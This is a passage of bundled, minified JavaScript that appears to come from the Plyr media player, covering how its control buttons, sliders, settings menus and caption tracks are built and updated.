              captions: j.call(this, this.config.selectors.buttons.captions),
              fullscreen: j.call(
                this,
                this.config.selectors.buttons.fullscreen
              ),
            }),
            (this.elements.progress = j.call(
              this,
              this.config.selectors.progress
            )),
            (this.elements.inputs = {
              seek: j.call(this, this.config.selectors.inputs.seek),
              volume: j.call(this, this.config.selectors.inputs.volume),
            }),
            (this.elements.display = {
              buffer: j.call(this, this.config.selectors.display.buffer),
              currentTime: j.call(
                this,
                this.config.selectors.display.currentTime
              ),
              duration: j.call(this, this.config.selectors.display.duration),
            }),
            m.element(this.elements.progress) &&
              (this.elements.display.seekTooltip =
                this.elements.progress.querySelector(
                  ".".concat(this.config.classNames.tooltip)
                )),
            !0
          );
        } catch (e) {
          return (
            this.debug.warn(
              "It looks like there is a problem with your custom controls HTML",
              e
            ),
            this.toggleNativeControls(!0),
            !1
          );
        }
      },
      createIcon: function (e, t) {
        var n = ce.getIconUrl.call(this),
          i = ""
            .concat(n.cors ? "" : n.url, "#")
            .concat(this.config.iconPrefix),
          a = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        T(a, J(t, { role: "presentation", focusable: "false" }));
        var s = document.createElementNS("http://www.w3.org/2000/svg", "use"),
          o = "".concat(i, "-").concat(e);
        return (
          "href" in s &&
            s.setAttributeNS("http://www.w3.org/1999/xlink", "href", o),
          s.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", o),
          a.appendChild(s),
          a
        );
      },
      createLabel: function (e) {
        var t =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
          n = te(e, this.config);
        return A(
          "span",
          Object.assign({}, t, {
            class: [t.class, this.config.classNames.hidden]
              .filter(Boolean)
              .join(" "),
          }),
          n
        );
      },
      createBadge: function (e) {
        if (m.empty(e)) return null;
        var t = A("span", { class: this.config.classNames.menu.value });
        return (
          t.appendChild(
            A("span", { class: this.config.classNames.menu.badge }, e)
          ),
          t
        );
      },
      createButton: function (e, t) {
        var n = Object.assign({}, t),
          i = X(e),
          a = {
            element: "button",
            toggle: !1,
            label: null,
            icon: null,
            labelPressed: null,
            iconPressed: null,
          };
        switch (
          (["element", "icon", "label"].forEach(function (e) {
            Object.keys(n).includes(e) && ((a[e] = n[e]), delete n[e]);
          }),
          "button" !== a.element ||
            Object.keys(n).includes("type") ||
            (n.type = "button"),
          Object.keys(n).includes("class")
            ? n.class.includes(this.config.classNames.control) ||
              (n.class += " ".concat(this.config.classNames.control))
            : (n.class = this.config.classNames.control),
          e)
        ) {
          case "play":
            (a.toggle = !0),
              (a.label = "play"),
              (a.labelPressed = "pause"),
              (a.icon = "play"),
              (a.iconPressed = "pause");
            break;
          case "mute":
            (a.toggle = !0),
              (a.label = "mute"),
              (a.labelPressed = "unmute"),
              (a.icon = "volume"),
              (a.iconPressed = "muted");
            break;
          case "captions":
            (a.toggle = !0),
              (a.label = "enableCaptions"),
              (a.labelPressed = "disableCaptions"),
              (a.icon = "captions-off"),
              (a.iconPressed = "captions-on");
            break;
          case "fullscreen":
            (a.toggle = !0),
              (a.label = "enterFullscreen"),
              (a.labelPressed = "exitFullscreen"),
              (a.icon = "enter-fullscreen"),
              (a.iconPressed = "exit-fullscreen");
            break;
          case "play-large":
            (n.class += " ".concat(
              this.config.classNames.control,
              "--overlaid"
            )),
              (i = "play"),
              (a.label = "play"),
              (a.icon = "play");
            break;
          default:
            m.empty(a.label) && (a.label = i), m.empty(a.icon) && (a.icon = e);
        }
        var s = A(a.element);
        return (
          a.toggle
            ? (s.appendChild(
                ce.createIcon.call(this, a.iconPressed, {
                  class: "icon--pressed",
                })
              ),
              s.appendChild(
                ce.createIcon.call(this, a.icon, { class: "icon--not-pressed" })
              ),
              s.appendChild(
                ce.createLabel.call(this, a.labelPressed, {
                  class: "label--pressed",
                })
              ),
              s.appendChild(
                ce.createLabel.call(this, a.label, {
                  class: "label--not-pressed",
                })
              ))
            : (s.appendChild(ce.createIcon.call(this, a.icon)),
              s.appendChild(ce.createLabel.call(this, a.label))),
          J(n, M(this.config.selectors.buttons[i], n)),
          T(s, n),
          "play" === i
            ? (m.array(this.elements.buttons[i]) ||
                (this.elements.buttons[i] = []),
              this.elements.buttons[i].push(s))
            : (this.elements.buttons[i] = s),
          s
        );
      },
      createRange: function (e, t) {
        var n = A(
          "input",
          J(
            M(this.config.selectors.inputs[e]),
            {
              type: "range",
              min: 0,
              max: 100,
              step: 0.01,
              value: 0,
              autocomplete: "off",
              role: "slider",
              "aria-label": te(e, this.config),
              "aria-valuemin": 0,
              "aria-valuemax": 100,
              "aria-valuenow": 0,
            },
            t
          )
        );
        return (
          (this.elements.inputs[e] = n), ce.updateRangeFill.call(this, n), n
        );
      },
      createProgress: function (e, t) {
        var n = A(
          "progress",
          J(
            M(this.config.selectors.display[e]),
            {
              min: 0,
              max: 100,
              value: 0,
              role: "presentation",
              "aria-hidden": !0,
            },
            t
          )
        );
        if ("volume" !== e) {
          n.appendChild(A("span", null, "0"));
          var i = { played: "played", buffer: "buffered" }[e],
            a = i ? te(i, this.config) : "";
          n.innerText = "% ".concat(a.toLowerCase());
        }
        return (this.elements.display[e] = n), n;
      },
      createTime: function (e) {
        var t = M(this.config.selectors.display[e]),
          n = A(
            "div",
            J(t, {
              class: ""
                .concat(this.config.classNames.display.time, " ")
                .concat(t.class ? t.class : "")
                .trim(),
              "aria-label": te(e, this.config),
            }),
            "00:00"
          );
        return (this.elements.display[e] = n), n;
      },
      bindMenuItemShortcuts: function (e, t) {
        var n = this;
        y(
          e,
          "keydown keyup",
          function (i) {
            if (
              [32, 38, 39, 40].includes(i.which) &&
              (i.preventDefault(), i.stopPropagation(), "keydown" !== i.type)
            ) {
              var a,
                s = I(e, '[role="menuitemradio"]');
              if (!s && [32, 39].includes(i.which))
                ce.showMenuPanel.call(n, t, !0);
              else
                32 !== i.which &&
                  (40 === i.which || (s && 39 === i.which)
                    ? ((a = e.nextElementSibling),
                      m.element(a) || (a = e.parentNode.firstElementChild))
                    : ((a = e.previousElementSibling),
                      m.element(a) || (a = e.parentNode.lastElementChild)),
                  O.call(n, a, !0));
            }
          },
          !1
        ),
          y(e, "keyup", function (e) {
            13 === e.which && ce.focusFirstMenuItem.call(n, null, !0);
          });
      },
      createMenuItem: function (e) {
        var t = this,
          n = e.value,
          i = e.list,
          a = e.type,
          s = e.title,
          o = e.badge,
          r = void 0 === o ? null : o,
          l = e.checked,
          c = void 0 !== l && l,
          u = M(this.config.selectors.inputs[a]),
          d = A(
            "button",
            J(u, {
              type: "button",
              role: "menuitemradio",
              class: ""
                .concat(this.config.classNames.control, " ")
                .concat(u.class ? u.class : "")
                .trim(),
              "aria-checked": c,
              value: n,
            })
          ),
          h = A("span");
        (h.innerHTML = s),
          m.element(r) && h.appendChild(r),
          d.appendChild(h),
          Object.defineProperty(d, "checked", {
            enumerable: !0,
            get: function () {
              return "true" === d.getAttribute("aria-checked");
            },
            set: function (e) {
              e &&
                Array.from(d.parentNode.children)
                  .filter(function (e) {
                    return I(e, '[role="menuitemradio"]');
                  })
                  .forEach(function (e) {
                    return e.setAttribute("aria-checked", "false");
                  }),
                d.setAttribute("aria-checked", e ? "true" : "false");
            },
          }),
          this.listeners.bind(
            d,
            "click keyup",
            function (e) {
              if (!m.keyboardEvent(e) || 32 === e.which) {
                switch (
                  (e.preventDefault(), e.stopPropagation(), (d.checked = !0), a)
                ) {
                  case "language":
                    t.currentTrack = Number(n);
                    break;
                  case "quality":
                    t.quality = n;
                    break;
                  case "speed":
                    t.speed = parseFloat(n);
                }
                ce.showMenuPanel.call(t, "home", m.keyboardEvent(e));
              }
            },
            a,
            !1
          ),
          ce.bindMenuItemShortcuts.call(this, d, a),
          i.appendChild(d);
      },
      formatTime: function () {
        var e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0,
          t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
        return m.number(e) ? le(e, se(this.duration) > 0, t) : e;
      },
      updateTimeDisplay: function () {
        var e =
            arguments.length > 0 && void 0 !== arguments[0]
              ? arguments[0]
              : null,
          t =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
          n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
        m.element(e) && m.number(t) && (e.innerText = ce.formatTime(t, n));
      },
      updateVolume: function () {
        this.supported.ui &&
          (m.element(this.elements.inputs.volume) &&
            ce.setRange.call(
              this,
              this.elements.inputs.volume,
              this.muted ? 0 : this.volume
            ),
          m.element(this.elements.buttons.mute) &&
            (this.elements.buttons.mute.pressed =
              this.muted || 0 === this.volume));
      },
      setRange: function (e) {
        var t =
          arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
        m.element(e) && ((e.value = t), ce.updateRangeFill.call(this, e));
      },
      updateProgress: function (e) {
        var t = this;
        if (this.supported.ui && m.event(e)) {
          var n,
            i,
            a = 0;
          if (e)
            switch (e.type) {
              case "timeupdate":
              case "seeking":
              case "seeked":
                (n = this.currentTime),
                  (i = this.duration),
                  (a =
                    0 === n || 0 === i || Number.isNaN(n) || Number.isNaN(i)
                      ? 0
                      : ((n / i) * 100).toFixed(2)),
                  "timeupdate" === e.type &&
                    ce.setRange.call(this, this.elements.inputs.seek, a);
                break;
              case "playing":
              case "progress":
                !(function (e, n) {
                  var i = m.number(n) ? n : 0,
                    a = m.element(e) ? e : t.elements.display.buffer;
                  if (m.element(a)) {
                    a.value = i;
                    var s = a.getElementsByTagName("span")[0];
                    m.element(s) && (s.childNodes[0].nodeValue = i);
                  }
                })(this.elements.display.buffer, 100 * this.buffered);
            }
        }
      },
      updateRangeFill: function (e) {
        var t = m.event(e) ? e.target : e;
        if (m.element(t) && "range" === t.getAttribute("type")) {
          if (I(t, this.config.selectors.inputs.seek)) {
            t.setAttribute("aria-valuenow", this.currentTime);
            var n = ce.formatTime(this.currentTime),
              i = ce.formatTime(this.duration),
              a = te("seekLabel", this.config);
            t.setAttribute(
              "aria-valuetext",
              a.replace("{currentTime}", n).replace("{duration}", i)
            );
          } else if (I(t, this.config.selectors.inputs.volume)) {
            var s = 100 * t.value;
            t.setAttribute("aria-valuenow", s),
              t.setAttribute("aria-valuetext", "".concat(s.toFixed(1), "%"));
          } else t.setAttribute("aria-valuenow", t.value);
          F.isWebkit &&
            t.style.setProperty(
              "--value",
              "".concat((t.value / t.max) * 100, "%")
            );
        }
      },
      updateSeekTooltip: function (e) {
        var t = this;
        if (
          this.config.tooltips.seek &&
          m.element(this.elements.inputs.seek) &&
          m.element(this.elements.display.seekTooltip) &&
          0 !== this.duration
        ) {
          var n = 0,
            i = this.elements.progress.getBoundingClientRect(),
            a = "".concat(this.config.classNames.tooltip, "--visible"),
            s = function (e) {
              L(t.elements.display.seekTooltip, a, e);
            };
          if (this.touch) s(!1);
          else {
            if (m.event(e)) n = (100 / i.width) * (e.pageX - i.left);
            else {
              if (!x(this.elements.display.seekTooltip, a)) return;
              n = parseFloat(this.elements.display.seekTooltip.style.left, 10);
            }
            n < 0 ? (n = 0) : n > 100 && (n = 100),
              ce.updateTimeDisplay.call(
                this,
                this.elements.display.seekTooltip,
                (this.duration / 100) * n
              ),
              (this.elements.display.seekTooltip.style.left = "".concat(
                n,
                "%"
              )),
              m.event(e) &&
                ["mouseenter", "mouseleave"].includes(e.type) &&
                s("mouseenter" === e.type);
          }
        }
      },
      timeUpdate: function (e) {
        var t =
          !m.element(this.elements.display.duration) && this.config.invertTime;
        ce.updateTimeDisplay.call(
          this,
          this.elements.display.currentTime,
          t ? this.duration - this.currentTime : this.currentTime,
          t
        ),
          (e && "timeupdate" === e.type && this.media.seeking) ||
            ce.updateProgress.call(this, e);
      },
      durationUpdate: function () {
        if (
          this.supported.ui &&
          (this.config.invertTime || !this.currentTime)
        ) {
          if (this.duration >= Math.pow(2, 32))
            return (
              N(this.elements.display.currentTime, !0),
              void N(this.elements.progress, !0)
            );
          m.element(this.elements.inputs.seek) &&
            this.elements.inputs.seek.setAttribute(
              "aria-valuemax",
              this.duration
            );
          var e = m.element(this.elements.display.duration);
          !e &&
            this.config.displayDuration &&
            this.paused &&
            ce.updateTimeDisplay.call(
              this,
              this.elements.display.currentTime,
              this.duration
            ),
            e &&
              ce.updateTimeDisplay.call(
                this,
                this.elements.display.duration,
                this.duration
              ),
            ce.updateSeekTooltip.call(this);
        }
      },
      toggleMenuButton: function (e, t) {
        N(this.elements.settings.buttons[e], !t);
      },
      updateSetting: function (e, t, n) {
        var i = this.elements.settings.panels[e],
          a = null,
          s = t;
        if ("captions" === e) a = this.currentTrack;
        else {
          if (
            ((a = m.empty(n) ? this[e] : n),
            m.empty(a) && (a = this.config[e].default),
            !m.empty(this.options[e]) && !this.options[e].includes(a))
          )
            return void this.debug.warn(
              "Unsupported value of '".concat(a, "' for ").concat(e)
            );
          if (!this.config[e].options.includes(a))
            return void this.debug.warn(
              "Disabled value of '".concat(a, "' for ").concat(e)
            );
        }
        if (
          (m.element(s) || (s = i && i.querySelector('[role="menu"]')),
          m.element(s))
        ) {
          this.elements.settings.buttons[e].querySelector(
            ".".concat(this.config.classNames.menu.value)
          ).innerHTML = ce.getLabel.call(this, e, a);
          var o = s && s.querySelector('[value="'.concat(a, '"]'));
          m.element(o) && (o.checked = !0);
        }
      },
      getLabel: function (e, t) {
        switch (e) {
          case "speed":
            return 1 === t
              ? te("normal", this.config)
              : "".concat(t, "&times;");
          case "quality":
            if (m.number(t)) {
              var n = te("qualityLabel.".concat(t), this.config);
              return n.length ? n : "".concat(t, "p");
            }
            return G(t);
          case "captions":
            return he.getLabel.call(this);
          default:
            return null;
        }
      },
      setQualityMenu: function (e) {
        var t = this;
        if (m.element(this.elements.settings.panels.quality)) {
          var n =
            this.elements.settings.panels.quality.querySelector(
              '[role="menu"]'
            );
          m.array(e) &&
            (this.options.quality = K(e).filter(function (e) {
              return t.config.quality.options.includes(e);
            }));
          var i =
            !m.empty(this.options.quality) && this.options.quality.length > 1;
          if (
            (ce.toggleMenuButton.call(this, "quality", i),
            C(n),
            ce.checkMenu.call(this),
            i)
          ) {
            var a = function (e) {
              var n = te("qualityBadge.".concat(e), t.config);
              return n.length ? ce.createBadge.call(t, n) : null;
            };
            this.options.quality
              .sort(function (e, n) {
                var i = t.config.quality.options;
                return i.indexOf(e) > i.indexOf(n) ? 1 : -1;
              })
              .forEach(function (e) {
                ce.createMenuItem.call(t, {
                  value: e,
                  list: n,
                  type: "quality",
                  title: ce.getLabel.call(t, "quality", e),
                  badge: a(e),
                });
              }),
              ce.updateSetting.call(this, "quality", n);
          }
        }
      },
      setCaptionsMenu: function () {
        var e = this;
        if (m.element(this.elements.settings.panels.captions)) {
          var t =
              this.elements.settings.panels.captions.querySelector(
                '[role="menu"]'
              ),
            n = he.getTracks.call(this),
            i = Boolean(n.length);
          if (
            (ce.toggleMenuButton.call(this, "captions", i),
            C(t),
            ce.checkMenu.call(this),
            i)
          ) {
            var a = n.map(function (n, i) {
              return {
                value: i,
                checked: e.captions.toggled && e.currentTrack === i,
                title: he.getLabel.call(e, n),
                badge:
                  n.language &&
                  ce.createBadge.call(e, n.language.toUpperCase()),
                list: t,
                type: "language",
              };
            });
            a.unshift({
              value: -1,
              checked: !this.captions.toggled,
              title: te("disabled", this.config),
              list: t,
              type: "language",
            }),
              a.forEach(ce.createMenuItem.bind(this)),
              ce.updateSetting.call(this, "captions", t);
          }
        }
      },
      setSpeedMenu: function (e) {
        var t = this;
        if (m.element(this.elements.settings.panels.speed)) {
          var n =
            this.elements.settings.panels.speed.querySelector('[role="menu"]');
          m.array(e)
            ? (this.options.speed = e)
            : (this.isHTML5 || this.isVimeo) &&
              (this.options.speed = [0.5, 0.75, 1, 1.25, 1.5, 1.75, 2]),
            (this.options.speed = this.options.speed.filter(function (e) {
              return t.config.speed.options.includes(e);
            }));
          var i = !m.empty(this.options.speed) && this.options.speed.length > 1;
          ce.toggleMenuButton.call(this, "speed", i),
            C(n),
            ce.checkMenu.call(this),
            i &&
              (this.options.speed.forEach(function (e) {
                ce.createMenuItem.call(t, {
                  value: e,
                  list: n,
                  type: "speed",
                  title: ce.getLabel.call(t, "speed", e),
                });
              }),
              ce.updateSetting.call(this, "speed", n));
        }
      },
      checkMenu: function () {
        var e = this.elements.settings.buttons,
          t =
            !m.empty(e) &&
            Object.values(e).some(function (e) {
              return !e.hidden;
            });
        N(this.elements.settings.menu, !t);
      },
      focusFirstMenuItem: function (e) {
        var t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
        if (!this.elements.settings.popup.hidden) {
          var n = e;
          m.element(n) ||
            (n = Object.values(this.elements.settings.panels).find(
              function (e) {
                return !e.hidden;
              }
            ));
          var i = n.querySelector('[role^="menuitem"]');
          O.call(this, i, t);
        }
      },
      toggleMenu: function (e) {
        var t = this.elements.settings.popup,
          n = this.elements.buttons.settings;
        if (m.element(t) && m.element(n)) {
          var i = t.hidden,
            a = i;
          if (m.boolean(e)) a = e;
          else if (m.keyboardEvent(e) && 27 === e.which) a = !1;
          else if (m.event(e)) {
            var s = t.contains(e.target);
            if (s || (!s && e.target !== n && a)) return;
          }
          n.setAttribute("aria-expanded", a),
            N(t, !a),
            L(this.elements.container, this.config.classNames.menu.open, a),
            a && m.keyboardEvent(e)
              ? ce.focusFirstMenuItem.call(this, null, !0)
              : a || i || O.call(this, n, m.keyboardEvent(e));
        }
      },
      getMenuSize: function (e) {
        var t = e.cloneNode(!0);
        (t.style.position = "absolute"),
          (t.style.opacity = 0),
          t.removeAttribute("hidden"),
          e.parentNode.appendChild(t);
        var n = t.scrollWidth,
          i = t.scrollHeight;
        return P(t), { width: n, height: i };
      },
      showMenuPanel: function () {
        var e = this,
          t =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
          n = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
          i = document.getElementById(
            "plyr-settings-".concat(this.id, "-").concat(t)
          );
        if (m.element(i)) {
          var a = i.parentNode,
            s = Array.from(a.children).find(function (e) {
              return !e.hidden;
            });
          if (W.transitions && !W.reducedMotion) {
            (a.style.width = "".concat(s.scrollWidth, "px")),
              (a.style.height = "".concat(s.scrollHeight, "px"));
            var o = ce.getMenuSize.call(this, i);
            y.call(this, a, D, function t(n) {
              n.target === a &&
                ["width", "height"].includes(n.propertyName) &&
                ((a.style.width = ""),
                (a.style.height = ""),
                v.call(e, a, D, t));
            }),
              (a.style.width = "".concat(o.width, "px")),
              (a.style.height = "".concat(o.height, "px"));
          }
          N(s, !0), N(i, !1), ce.focusFirstMenuItem.call(this, i, n);
        }
      },
      setDownloadLink: function () {
        var e = this.elements.buttons.download;
        m.element(e) && e.setAttribute("href", this.download);
      },
      create: function (e) {
        var t = this,
          n = A("div", M(this.config.selectors.controls.wrapper));
        if (
          (this.config.controls.includes("restart") &&
            n.appendChild(ce.createButton.call(this, "restart")),
          this.config.controls.includes("rewind") &&
            n.appendChild(ce.createButton.call(this, "rewind")),
          this.config.controls.includes("play") &&
            n.appendChild(ce.createButton.call(this, "play")),
          this.config.controls.includes("fast-forward") &&
            n.appendChild(ce.createButton.call(this, "fast-forward")),
          this.config.controls.includes("progress"))
        ) {
          var i = A("div", M(this.config.selectors.progress));
          if (
            (i.appendChild(
              ce.createRange.call(this, "seek", {
                id: "plyr-seek-".concat(e.id),
              })
            ),
            i.appendChild(ce.createProgress.call(this, "buffer")),
            this.config.tooltips.seek)
          ) {
            var a = A(
              "span",
              { class: this.config.classNames.tooltip },
              "00:00"
            );
            i.appendChild(a), (this.elements.display.seekTooltip = a);
          }
          (this.elements.progress = i), n.appendChild(this.elements.progress);
        }
        if (
          (this.config.controls.includes("current-time") &&
            n.appendChild(ce.createTime.call(this, "currentTime")),
          this.config.controls.includes("duration") &&
            n.appendChild(ce.createTime.call(this, "duration")),
          this.config.controls.includes("mute") ||
            this.config.controls.includes("volume"))
        ) {
          var s = A("div", { class: "plyr__volume" });
          if (
            (this.config.controls.includes("mute") &&
              s.appendChild(ce.createButton.call(this, "mute")),
            this.config.controls.includes("volume"))
          ) {
            var o = { max: 1, step: 0.05, value: this.config.volume };
            s.appendChild(
              ce.createRange.call(
                this,
                "volume",
                J(o, { id: "plyr-volume-".concat(e.id) })
              )
            ),
              (this.elements.volume = s);
          }
          n.appendChild(s);
        }
        if (
          (this.config.controls.includes("captions") &&
            n.appendChild(ce.createButton.call(this, "captions")),
          this.config.controls.includes("settings") &&
            !m.empty(this.config.settings))
        ) {
          var r = A("div", { class: "plyr__menu", hidden: "" });
          r.appendChild(
            ce.createButton.call(this, "settings", {
              "aria-haspopup": !0,
              "aria-controls": "plyr-settings-".concat(e.id),
              "aria-expanded": !1,
            })
          );
          var l = A("div", {
              class: "plyr__menu__container",
              id: "plyr-settings-".concat(e.id),
              hidden: "",
            }),
            c = A("div"),
            u = A("div", { id: "plyr-settings-".concat(e.id, "-home") }),
            d = A("div", { role: "menu" });
          u.appendChild(d),
            c.appendChild(u),
            (this.elements.settings.panels.home = u),
            this.config.settings.forEach(function (n) {
              var i = A(
                "button",
                J(M(t.config.selectors.buttons.settings), {
                  type: "button",
                  class: ""
                    .concat(t.config.classNames.control, " ")
                    .concat(t.config.classNames.control, "--forward"),
                  role: "menuitem",
                  "aria-haspopup": !0,
                  hidden: "",
                })
              );
              ce.bindMenuItemShortcuts.call(t, i, n),
                y(i, "click", function () {
                  ce.showMenuPanel.call(t, n, !1);
                });
              var a = A("span", null, te(n, t.config)),
                s = A("span", { class: t.config.classNames.menu.value });
              (s.innerHTML = e[n]),
                a.appendChild(s),
                i.appendChild(a),
                d.appendChild(i);
              var o = A("div", {
                  id: "plyr-settings-".concat(e.id, "-").concat(n),
                  hidden: "",
                }),
                r = A("button", {
                  type: "button",
                  class: ""
                    .concat(t.config.classNames.control, " ")
                    .concat(t.config.classNames.control, "--back"),
                });
              r.appendChild(A("span", { "aria-hidden": !0 }, te(n, t.config))),
                r.appendChild(
                  A(
                    "span",
                    { class: t.config.classNames.hidden },
                    te("menuBack", t.config)
                  )
                ),
                y(
                  o,
                  "keydown",
                  function (e) {
                    37 === e.which &&
                      (e.preventDefault(),
                      e.stopPropagation(),
                      ce.showMenuPanel.call(t, "home", !0));
                  },
                  !1
                ),
                y(r, "click", function () {
                  ce.showMenuPanel.call(t, "home", !1);
                }),
                o.appendChild(r),
                o.appendChild(A("div", { role: "menu" })),
                c.appendChild(o),
                (t.elements.settings.buttons[n] = i),
                (t.elements.settings.panels[n] = o);
            }),
            l.appendChild(c),
            r.appendChild(l),
            n.appendChild(r),
            (this.elements.settings.popup = l),
            (this.elements.settings.menu = r);
        }
        if (
          (this.config.controls.includes("pip") &&
            W.pip &&
            n.appendChild(ce.createButton.call(this, "pip")),
          this.config.controls.includes("airplay") &&
            W.airplay &&
            n.appendChild(ce.createButton.call(this, "airplay")),
          this.config.controls.includes("download"))
        ) {
          var h = { element: "a", href: this.download, target: "_blank" },
            p = this.config.urls.download;
          !m.url(p) &&
            this.isEmbed &&
            J(h, { icon: "logo-".concat(this.provider), label: this.provider }),
            n.appendChild(ce.createButton.call(this, "download", h));
        }
        return (
          this.config.controls.includes("fullscreen") &&
            n.appendChild(ce.createButton.call(this, "fullscreen")),
          this.config.controls.includes("play-large") &&
            this.elements.container.appendChild(
              ce.createButton.call(this, "play-large")
            ),
          (this.elements.controls = n),
          this.isHTML5 &&
            ce.setQualityMenu.call(this, z.getQualityOptions.call(this)),
          ce.setSpeedMenu.call(this),
          n
        );
      },
      inject: function () {
        var e = this;
        if (this.config.loadSprite) {
          var t = ce.getIconUrl.call(this);
          t.cors && ae(t.url, "sprite-plyr");
        }
        this.id = Math.floor(1e4 * Math.random());
        var n = null;
        this.elements.controls = null;
        var i = {
            id: this.id,
            seektime: this.config.seekTime,
            title: this.config.title,
          },
          s = !0;
        m.function(this.config.controls) &&
          (this.config.controls = this.config.controls.call(this, i)),
          this.config.controls || (this.config.controls = []),
          m.element(this.config.controls) || m.string(this.config.controls)
            ? (n = this.config.controls)
            : ((n = ce.create.call(this, {
                id: this.id,
                seektime: this.config.seekTime,
                speed: this.speed,
                quality: this.quality,
                captions: he.getLabel.call(this),
              })),
              (s = !1));
        var o,
          r = function (e) {
            var t = e;
            return (
              Object.entries(i).forEach(function (e) {
                var n = a(e, 2),
                  i = n[0],
                  s = n[1];
                t = $(t, "{".concat(i, "}"), s);
              }),
              t
            );
          };
        if (
          (s &&
            (m.string(this.config.controls)
              ? (n = r(n))
              : m.element(n) && (n.innerHTML = r(n.innerHTML))),
          m.string(this.config.selectors.controls.container) &&
            (o = document.querySelector(
              this.config.selectors.controls.container
            )),
          m.element(o) || (o = this.elements.container),
          o[m.element(n) ? "insertAdjacentElement" : "insertAdjacentHTML"](
            "afterbegin",
            n
          ),
          m.element(this.elements.controls) || ce.findElements.call(this),
          !m.empty(this.elements.buttons))
        ) {
          var l = function (t) {
            var n = e.config.classNames.controlPressed;
            Object.defineProperty(t, "pressed", {
              enumerable: !0,
              get: function () {
                return x(t, n);
              },
              set: function () {
                var e =
                  arguments.length > 0 &&
                  void 0 !== arguments[0] &&
                  arguments[0];
                L(t, n, e);
              },
            });
          };
          Object.values(this.elements.buttons)
            .filter(Boolean)
            .forEach(function (e) {
              m.array(e) || m.nodeList(e)
                ? Array.from(e).filter(Boolean).forEach(l)
                : l(e);
            });
        }
        if (
          (window.navigator.userAgent.includes("Edge") && H(o),
          this.config.tooltips.controls)
        ) {
          var c = this.config,
            u = c.classNames,
            d = c.selectors,
            h = ""
              .concat(d.controls.wrapper, " ")
              .concat(d.labels, " .")
              .concat(u.hidden),
            p = _.call(this, h);
          Array.from(p).forEach(function (t) {
            L(t, e.config.classNames.hidden, !1),
              L(t, e.config.classNames.tooltip, !0);
          });
        }
      },
    };
    function ue(e) {
      var t = e;
      if (!(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1]) {
        var n = document.createElement("a");
        (n.href = t), (t = n.href);
      }
      try {
        return new URL(t);
      } catch (e) {
        return null;
      }
    }
    function de(e) {
      var t = new URLSearchParams();
      return (
        m.object(e) &&
          Object.entries(e).forEach(function (e) {
            var n = a(e, 2),
              i = n[0],
              s = n[1];
            t.set(i, s);
          }),
        t
      );
    }
    var he = {
        setup: function () {
          if (this.supported.ui)
            if (
              !this.isVideo ||
              this.isYouTube ||
              (this.isHTML5 && !W.textTracks)
            )
              m.array(this.config.controls) &&
                this.config.controls.includes("settings") &&
                this.config.settings.includes("captions") &&
                ce.setCaptionsMenu.call(this);
            else {
              var e, t;
              if (
                (m.element(this.elements.captions) ||
                  ((this.elements.captions = A(
                    "div",
                    M(this.config.selectors.captions)
                  )),
                  (e = this.elements.captions),
                  (t = this.elements.wrapper),
                  m.element(e) &&
                    m.element(t) &&
                    t.parentNode.insertBefore(e, t.nextSibling)),
                F.isIE && window.URL)
              ) {
                var n = this.media.querySelectorAll("track");
                Array.from(n).forEach(function (e) {
                  var t = e.getAttribute("src"),
                    n = ue(t);
                  null !== n &&
                    n.hostname !== window.location.href.hostname &&
                    ["http:", "https:"].includes(n.protocol) &&
                    ie(t, "blob")
                      .then(function (t) {
                        e.setAttribute("src", window.URL.createObjectURL(t));
                      })
                      .catch(function () {
                        P(e);
                      });
                });
              }
              var i = K(
                  (
                    navigator.languages || [
                      navigator.language || navigator.userLanguage || "en",
                    ]
                  ).map(function (e) {
                    return e.split("-")[0];
                  })
                ),
                s = (
                  this.storage.get("language") ||
                  this.config.captions.language ||
                  "auto"
                ).toLowerCase();
              if ("auto" === s) s = a(i, 1)[0];
              var o = this.storage.get("captions");
              if (
                (m.boolean(o) || (o = this.config.captions.active),
                Object.assign(this.captions, {
                  toggled: !1,
                  active: o,
                  language: s,
                  languages: i,
                }),
                this.isHTML5)
              ) {
                var r = this.config.captions.update
                  ? "addtrack removetrack"
                  : "removetrack";
                y.call(this, this.media.textTracks, r, he.update.bind(this));
              }
              setTimeout(he.update.bind(this), 0);
            }
        },
        update: function () {
          var e = this,
            t = he.getTracks.call(this, !0),
            n = this.captions,
            i = n.active,
            a = n.language,
            s = n.meta,
            o = n.currentTrackNode,
            r = Boolean(
              t.find(function (e) {
                return e.language === a;
              })
            );
          this.isHTML5 &&
            this.isVideo &&
            t
              .filter(function (e) {
                return !s.get(e);
              })
              .forEach(function (t) {
                e.debug.log("Track added", t),
                  s.set(t, { default: "showing" === t.mode }),
                  (t.mode = "hidden"),
                  y.call(e, t, "cuechange", function () {
                    return he.updateCues.call(e);
                  });
              }),
            ((r && this.language !== a) || !t.includes(o)) &&
              (he.setLanguage.call(this, a), he.toggle.call(this, i && r)),
            L(
              this.elements.container,
              this.config.classNames.captions.enabled,
              !m.empty(t)
            ),
            (this.config.controls || []).includes("settings") &&
              this.config.settings.includes("captions") &&
              ce.setCaptionsMenu.call(this);
        },
        toggle: function (e) {
          var t =
            !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
          if (this.supported.ui) {
            var n = this.captions.toggled,
              i = this.config.classNames.captions.active,
              a = m.nullOrUndefined(e) ? !n : e;
            if (a !== n) {
              if (
                (t ||
                  ((this.captions.active = a),
                  this.storage.set({ captions: a })),
                !this.language && a && !t)
              ) {
                var o = he.getTracks.call(this),
                  r = he.findTrack.call(
                    this,
                    [this.captions.language].concat(s(this.captions.languages)),
                    !0
                  );
                return (
                  (this.captions.language = r.language),
                  void he.set.call(this, o.indexOf(r))
                );
              }
              this.elements.buttons.captions &&
                (this.elements.buttons.captions.pressed = a),
                L(this.elements.container, i, a),
                (this.captions.toggled = a),
                ce.updateSetting.call(this, "captions"),
                k.call(
                  this,
                  this.media,
                  a ? "captionsenabled" : "captionsdisabled"
                );
            }
          }
        },
        set: function (e) {
          var t =
              !(arguments.length > 1 && void 0 !== arguments[1]) ||
              arguments[1],
